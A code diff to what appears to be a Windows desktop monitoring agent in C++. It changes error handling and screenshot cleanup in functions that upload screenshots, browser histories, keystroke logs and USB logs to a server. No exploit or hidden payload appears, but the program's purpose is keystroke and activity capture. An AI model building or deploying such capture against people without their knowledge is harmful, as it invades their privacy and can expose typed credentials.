@@ -841,8 +841,8 @@ bool sendScreenshot(const std::string& filePath) {
     if(selectedMonitorId.load()<1)return false;
     std::string response = httpPostFile(url, filePath);
     
-    // Delete the temporary file after sending
-    DeleteFileA(filePath.c_str());
+    // Keep failed captures available for investigation/retry; remove after
+    // the server explicitly acknowledges successful storage.
     
     // Parse response
     Json::Value root;
@@ -856,6 +856,7 @@ bool sendScreenshot(const std::string& filePath) {
                 connectionStatus.serverConnected = true;
                 connectionStatus.lastSuccess = std::chrono::steady_clock::now();
             }
+            DeleteFileA(filePath.c_str());
             writeDebugLog("Screenshot uploaded successfully");
             updateTrayIcon();
             checkConnectionStatusChange();
@@ -863,9 +864,11 @@ bool sendScreenshot(const std::string& filePath) {
         } else if (root.isMember("error")) {
             std::string errorMsg = root["error"].asString();
             writeDebugLog("Screenshot upload error: " + errorMsg);
+            connectionStatus.lastError = "Screenshot: " + errorMsg;
         }
     }
     else {
+        writeDebugLog("Screenshot upload response was not valid JSON or was empty.");
         std::lock_guard<std::mutex> lock(statusMutex);
         connectionStatus.lastScreenshotStatus = "Failed: " + getCurrentDateTimeString();
         connectionStatus.serverConnected = false;
@@ -911,6 +914,7 @@ bool sendTicEvent() {
         } else if (root.isMember("error")) {
             std::string errorMsg = root["error"].asString();
             writeDebugLog("Tic event error: " + errorMsg);
+            connectionStatus.lastError = "Tic event: " + errorMsg;
         }
     }
     else {
@@ -969,6 +973,7 @@ bool sendBrowserHistories() {
         } else if (root.isMember("error")) {
             std::string errorMsg = root["error"].asString();
             writeDebugLog("Browser history upload error: " + errorMsg);
+            connectionStatus.lastError = "Browser history upload: " + errorMsg;
         }
     }
     else {
@@ -1027,6 +1032,7 @@ bool sendKeyLogs() {
         } else if (root.isMember("error")) {
             std::string errorMsg = root["error"].asString();
             writeDebugLog("Key log upload error: " + errorMsg);
+            connectionStatus.lastError = "Key log upload: " + errorMsg;
         }
     }
     else {
@@ -1094,6 +1100,7 @@ bool sendUSBLogs() {
         } else if (root.isMember("error")) {
             std::string errorMsg = root["error"].asString();
             writeDebugLog("USB log upload error: " + errorMsg);
+            connectionStatus.lastError = "USB log upload: " + errorMsg;
         }
     }
     else {
@@ -3305,8 +3312,7 @@ void sendInitialDataRequests() {
     updateTrayMenu();
     std::this_thread::sleep_for(std::chrono::milliseconds(1000));
     
-    // Delete the temporary screenshot file
-    DeleteFileA(screenshotPath.c_str());
+    // sendScreenshot removes the file only after the backend confirms receipt.
     
     // Clean up any other temporary files
     cleanupTemporaryFiles();
